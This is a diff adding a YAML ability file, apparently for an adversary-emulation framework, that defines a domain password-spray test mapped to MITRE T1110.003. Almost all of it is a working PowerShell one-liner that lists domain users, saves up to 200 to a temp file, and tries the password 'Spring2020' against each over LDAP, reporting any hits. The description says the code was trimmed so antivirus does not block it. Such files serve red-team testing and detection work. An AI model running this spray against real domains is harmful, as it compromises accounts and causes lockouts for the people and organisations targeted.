@@ -1,0 +1,37 @@
+---
+- id: 279d24eeb12b40e4547945accf59ca62
+  name: Password Spray Invoke-DomainPasswordSpray Light
+  description: "Perform a domain password spray using the same core method of the\
+    \ [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray)\
+    \ \nbut without all the extra code that makes the script get blocked by many AVs.\
+    \ \nThis atomic test will attempt a single password against all users in a password\
+    \ list at $env:Temp\\usersdpsLight.txt. You can create this file manually\nor\
+    \ with the automated prereq_command. The prereq_command will limit the user list\
+    \ to 200 users by default to help you avoid massive account lockout.\n"
+  tactic: credential-access
+  technique:
+    attack_id: T1110.003
+    name: 'Brute Force: Password Spraying'
+  platforms:
+    windows:
+      psh:
+        command: if (Test-Path  $env:Temp\usersdpsLight.txt) { ; } else {Write-Host
+          -NoNewLine "Reading Users."; $netOutput = net users /domain; $netOutput
+          = [System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)]);
+          $userLimit = 200; $usercount = 0; foreach ($line in $netOutput) {;   if($usercount
+          -ge $userLimit){break};   $line = $line.trim();   $line = $line -split '\s\s+';   foreach
+          ($user in $line){;     if($usercount -ge $userLimit){break};     Add-Content
+          $env:Temp\usersdpsLight.txt $user;     $usercount = $usercount + 1;     }  ;
+          }; Write-Host "Usernames saved to $env:Temp\usersdpsLight.txt"};  function
+          Invoke-dpsLight ($Password, $userlist) {; $users = Get-Content $userlist;
+          $Domain = "LDAP://" + ([ADSI]"").distinguishedName; foreach ($User in $users)
+          {;   $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,
+          $User, $Password);   if ($Domain_check.name -ne $null) {;     Write-Host
+          -ForegroundColor Green "Password found for User:$User Password:$Password";   };   else
+          { Write-Host ". " -NoNewline}; }; Write-Host -ForegroundColor green "Finished";
+          }; Invoke-dpsLight "Spring2020" $env:Temp\usersdpsLight.txt
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
